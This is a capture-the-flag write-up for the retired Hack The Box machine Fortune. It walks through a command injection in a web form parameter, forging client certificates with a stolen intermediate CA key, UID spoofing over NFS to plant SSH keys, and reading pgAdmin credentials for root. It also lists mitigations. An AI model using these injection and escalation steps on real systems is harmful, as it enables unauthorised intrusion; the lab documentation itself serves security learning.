---
machine: Fortune
os: FreeBSD
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [freebsd, command-injection, certificates, authpf, nfs]
---

# Fortune — Hack The Box (FreeBSD)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `fortune` selector on 80 is command-injectable. That reads the intermediate CA key and certificate, a client certificate is generated, and the HTTPS site on 443 explains `authpf`. `authpf` opens NFS over `/home`; UID spoofing adds an SSH key and logs in as `bob` or `charlie`. pgAdmin credentials provide root.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh
80/tcp   http
443/tcp  https   client certificate required
2049/tcp nfs     after authpf
```

## Enumeration

- The form on 80 sends `db=<selection>` to `/select`.
- The parameter is concatenated into a `fortune` call; `;id` confirms execution.
- HTTPS on 443 requests a client certificate and reveals an intermediate CA.
- The injection reads `/home/bob/ca` and the CA private key.

## Foothold

The injection is confirmed and files are enumerated as `_fortune`. The intermediate CA signs a client certificate, imported into a browser or used with `curl`.

```bash
curl -s -X POST http://<IP>/select -d 'db=;id'
openssl req -new -key client.key -out client.csr
openssl x509 -req -in client.csr -CA intermediate.cert.pem   -CAkey intermediate.key.pem -CAcreateserial -out client.pem -days 1
curl -k --cert client.pem --key client.key https://<IP>/
```

## Lateral movement

The site on 443 instructs the user to use `authpf`. SSH connects with the provided key and activates the `pf` anchor, opening NFS and other internal ports.

With NFS over `/home` and `no_all_squash`, a `.ssh` directory and `authorized_keys` are created with the attacker key while spoofing `bob` or `charlie`'s UID.

```bash
ssh -i authpf.key authpf@<IP>
showmount -e <IP>
sudo mount -t nfs <IP>:/home /mnt/home
```

## Privilege escalation

The pgAdmin database contains credentials for a privileged user. They are reused to switch to root or connect to the administrative service.

```bash
sqlite3 /var/lib/pgadmin/pgadmin4.db 'select * from server;'
su -
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- Concatenating input into a command line is direct RCE.
- A client CA accessible from the app defeats mutual authentication.
- `authpf` only protects if the user cannot modify themselves.
- NFS with `no_all_squash` allows writing as other UIDs.
- Administrative tool databases store secrets.

## Mitigations and detection

- Use allowlists and `execve` without a shell for `fortune`.
- Keep the CA key off the web server and rotate it.
- Export `/home` with `all_squash` and only to specific hosts.
- Encrypt pgAdmin credentials and restrict its database.

## References

- [0xdf — Fortune](https://0xdf.gitlab.io/2019/08/03/htb-fortune.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+fortune)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+fortune+writeup)
